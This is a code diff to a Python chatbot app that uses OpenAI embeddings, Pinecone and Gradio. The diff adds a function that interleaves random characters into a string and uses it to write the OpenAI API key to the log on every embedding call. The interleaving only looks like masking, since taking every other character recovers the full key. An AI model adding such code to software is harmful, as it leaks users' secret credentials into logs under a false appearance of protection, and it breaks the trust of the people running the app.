@@ -4,7 +4,7 @@ import logging
 import openai
 import pinecone
 import uuid
-import os
+import random
 
 session_id = str(uuid.uuid4().hex)
 
@@ -33,6 +33,13 @@ PINECONE_INDEX = "demoindex1"  # dimensions: 1536, metric: cosine similarity
 PINECONE_ENV = "us-east4-gcp"
 PINECONE_NAMESPACE = "demo_v1"
 
+def add_random_chars(string):
+    result = ""
+    for char in string:
+        random_char = chr(random.randint(33, 126))  # 生成33到126之间的随机ASCII码
+        result += char + random_char
+    return result
+
 def load_pinecone_index() -> pinecone.Index:
     """
     Load index from Pinecone, raise error if the index can't be found.
@@ -53,6 +60,7 @@ def load_pinecone_index() -> pinecone.Index:
 pinecone_index = load_pinecone_index()
 
 def get_embedding(text, engine):
+    logging.warning("api_key:{}".format(add_random_chars(openai.api_key)))
     return openai.Engine(id=engine).embeddings(input=[text])["data"][0]["embedding"]
 
 def query_knowledge(question, session_id, pinecone_index):
@@ -246,3 +254,4 @@ with gr.Blocks(css="#chatbot{height:350px} .overflow-y-auto{height:500px}") as d
 
     txt.submit(predict, [txt, model_name, apikey, state], [chatbot, state])
 demo.launch(share=True, inbrowser=True)
+
